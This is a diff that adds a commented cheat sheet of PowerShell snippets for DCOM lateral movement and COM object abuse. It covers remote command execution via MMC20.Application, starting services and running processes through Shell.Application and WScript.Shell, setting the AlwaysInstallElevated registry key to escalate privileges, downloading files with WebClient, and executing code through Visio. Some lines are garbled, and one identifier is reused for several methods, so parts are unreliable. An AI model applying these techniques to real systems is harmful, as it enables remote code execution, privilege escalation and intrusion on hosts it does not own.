@@ -1,0 +1,49 @@
+# "MMC20.Application", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart","DetectOffice","RegisterXLL","ExcelDDE"
+
+# ShellWindows -       9BA05972-F6A8-11CF-A442-00A0C90A8F39
+# ShellBrowserWindow - C08AFD90-F2A1-11D1-8455-00A0C91F3880
+# CheckDomain -        C08AFD90-F2A1-11D1-8455-00A0C91F3880
+# ServiceCheck -       C08AFD90-F2A1-11D1-8455-00A0C91F3880
+# MinimizeAll -        C08AFD90-F2A1-11D1-8455-00A0C91F3880
+# ServiceStop -        C08AFD90-F2A1-11D1-8455-00A0C91F3880
+# ServiceStart -       C08AFD90-F2A1-11D1-8455-00A0C91F3880
+
+# $Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
+# $Obj = $Com)
+# $Obj.Document.ActiveView.ExecuteShellCommand($Command,$null,$null,"7")
+
+# $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
+# $Obj = [System.Activator]::CreateInstance($Com)
+
+# $ShellApp = New-Object -ComObject Shell.Application
+# {286e6f1b-7113-4355-9562-96b7e9d64c54}
+# $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID('{286e6f1b-7113-4355-9562-96b7e9d64c54}'))
+# ServiceStart
+# $ShellApp.ServiceStart('BTAGService', $false)
+# ServiceStop
+# $ShellApp.ServiceStop('BTAGService', $false)
+
+# ShellExecute
+# $WscriptShell = New-Object -ComObject WScript.Shell
+# {41904400-be18-11d3-a28b-00104bd35090}
+# Run
+# $WscriptShell.Run('calc.exe')
+
+# Exec
+# $WscriptShell.Exec('calc.exe')
+
+# RegRead
+# $WscriptShell.RegRead('HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')
+# $WscriptShell.RegRead("HKEY_CURRENT_USER\Volatile Environment\LOGONSERVER")
+# RegWrite
+# $WscriptShell.RegWrite('HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated', 1, REG_DWORD)
+
+# System.Net.WebClient
+# $wc = New-Object System.Net.WebClient
+# $wc.DownloadFile($url,$file)
+
+# Visio
+# $visio = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Visio.InvisibleApp"))
+# $doc = $visio.Documents.Add("")
+# $doc.ExecuteLine('CreateObject("WscriptShell").Exec("calc.exe")')
+
